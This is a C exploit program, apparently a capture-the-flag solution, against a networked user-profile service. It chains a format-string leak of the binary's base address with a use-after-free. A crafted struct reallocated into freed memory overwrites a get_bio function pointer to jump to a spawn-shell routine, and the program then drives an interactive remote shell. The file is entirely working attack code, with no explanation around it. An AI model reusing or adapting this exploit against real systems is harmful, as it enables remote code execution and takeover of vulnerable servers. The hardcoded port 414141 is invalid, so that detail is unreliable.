#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <inttypes.h>



int userfd1, userfd2;

/* 
 * base leak pos: 264
 * base substract 0x1688
 */

#define LEAK_POS 264
#define BASE_OFFSET 0x1688
#define SPAWN_SHELL_OFFSET 0x00001317


 struct user {
    char *name;
    char *bio;
    int  fd_online;
    int (*get_bio)(int fd, char *bio);
    struct user *next;
    struct user *prev;
};


static int open_connection(in_addr_t dip, int dport)
{
   int pconn, opt = 1;
   struct sockaddr_in cdata;
   struct timeval timeout;

   /* timeout.tv_sec  = _opts.timeout; */
   timeout.tv_sec  = 8;
   timeout.tv_usec = 0;

   /* Set socket options and create it */
   cdata.sin_addr.s_addr = dip;
   cdata.sin_port = htons(dport);
   cdata.sin_family = AF_INET;

   pconn = socket(AF_INET, SOCK_STREAM, 0);
   
   if( pconn < 0 ) {
      printf("Socket error: %i\n", pconn);
      printf("Err message: %s\n", strerror(errno));
      return -1;
   }

   /* Set socket timeout */
   if ( setsockopt(pconn, SOL_SOCKET, SO_RCVTIMEO,
           (void *)&timeout, sizeof(struct timeval)) != 0)
      perror("setsockopt SO_RCVTIMEO: ");
   
   /* Set socket options */
   if ( setsockopt(pconn, SOL_SOCKET, SO_SNDTIMEO,
           (void *)&timeout, sizeof(struct timeval)) != 0)
      perror("setsockopt SO_SNDTIMEO: ");

  setsockopt(pconn, SOL_TCP, TCP_NODELAY, &opt, sizeof(opt));
      

   /* Make connection */
   if (connect(pconn,(struct sockaddr *) &cdata, sizeof(cdata)) != 0) {
      close(pconn);
      return -1;
   }
   
   return pconn;
}


/*
 * shell(): semi-interactive shell hack
 */
static void shell(int fd)
{
    fd_set  fds;
    char    tmp[128];
    int n;
     
    /* check uid */
    write(fd, "id\n", 3);
  
    /* semi-interactive shell */
    for (;;) {
        FD_ZERO(&fds);
        FD_SET(fd, &fds);
        FD_SET(0, &fds);
  
        if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) < 0) {
            perror("select");
            break;
        }
  
        /* read from fd and write to stdout */
        if (FD_ISSET(fd, &fds)) {
            if ((n = read(fd, tmp, sizeof(tmp))) < 0) {
                fprintf(stderr, "Goodbye...\n");
                break;
            }
            if (write(1, tmp, n) < 0) {
                perror("write");
                break;
            }
        }
  
        /* read from stdin and write to fd */
        if (FD_ISSET(0, &fds)) {
            if ((n = read(0, tmp, sizeof(tmp))) < 0) {
                perror("read");
                break;
            }
            if (write(fd, tmp, n) < 0) {
                perror("write");
                break;
            }
        }
    }
}


void leakat(int fd, int pos)
{
   char rbuff[1024], wbuff[1024];

   bzero(rbuff, sizeof(rbuff));
   bzero(wbuff, sizeof(wbuff));

   read(fd, rbuff, sizeof(rbuff));
   write(fd, "setbio\n", 7);
   read(fd, rbuff, sizeof(rbuff));

   sprintf(wbuff, "%%%d$p\n", pos);
   write(fd, wbuff, strlen(wbuff));

   read(fd, rbuff, sizeof(rbuff));
   write(fd, "getbio pepe\n", 12);

   bzero(rbuff, sizeof(rbuff));
   read(fd, rbuff, sizeof(rbuff));

   printf("pos %d: %s\n", pos, rbuff);

}


u_int64_t leak_base(int fd, int pos)
{
   int bread;
   long long res;
   char rbuff[1024], wbuff[1024];

   bzero(rbuff, sizeof(rbuff));
   bzero(wbuff, sizeof(wbuff));

   read(fd, rbuff, sizeof(rbuff));
   write(fd, "setbio\n", 7);
   read(fd, rbuff, sizeof(rbuff));

   sprintf(wbuff, "%%%d$lld\n", pos);
   write(fd, wbuff, strlen(wbuff));

   read(fd, rbuff, sizeof(rbuff));
   write(fd, "getbio pepe\n", 12);

   bzero(rbuff, sizeof(rbuff));
   bread = read(fd, rbuff, sizeof(rbuff));
   rbuff[bread-1] = '\0';

   //printf("rbuff: %s\n", rbuff);
   res = atoll(rbuff);


   return res - BASE_OFFSET;
}


int init_user(const char *addr, const char *name)
{
   int fd;
   in_addr_t host;
   char tmpbuf[1024];

   host = inet_addr(addr);
   fd = open_connection(host, 414141);
   if (fd < 0) {
      printf("Error connecting\n");
      exit(1);
   }

   read(fd, tmpbuf, sizeof(tmpbuf));
   write(fd, name, strlen(name));

   return fd;
}


int main(int argc, char const *argv[])
{
   int x;
   uint64_t base, target;
   struct user *tmpuser;
   char rbuff[1024], wbuff[1024];

   userfd1 = init_user(argv[1], "pepe\n");
   userfd2 = init_user(argv[1], "broulio\n");


   // for (x=0; x<400; x++)
   //    leakat(userfd1, x);

   base = leak_base(userfd1, LEAK_POS);
   target = base + SPAWN_SHELL_OFFSET;
   printf("Base is at: 0x%" PRIx64 "\n", base);
   printf("Target code is at: 0x%" PRIx64 "\n", target);

   /* Prepare the payload */
   memset(wbuff, 'A', sizeof(struct user));
   tmpuser = (struct user *)wbuff;
   tmpuser->get_bio = (void *)target;

   /* Deallocate main user */
   printf("Freeing the user\n");
   write(userfd1, "delete\n", 7);
   usleep(2000);

   //return 0;

   /* Allocate into the freed chunk */
   printf("Allocating over the freed chunk\n");
   write(userfd1, "setbio\n", 7);
   sleep(1);
   write(userfd1, wbuff, sizeof(struct user));
   usleep(2000);

   /* Calling get_bio to trigger payload */
   printf("Calling get_bio to trigger our payload\n");
   write(userfd1, "getbio broulio\n", 15);
   usleep(2000);

   write(userfd1, "getbio broulio\n", 15);
   //write(userfd1, "getbio broulio\n", 15);


   /* Try the shell */
   shell(userfd1);


   return 0;
}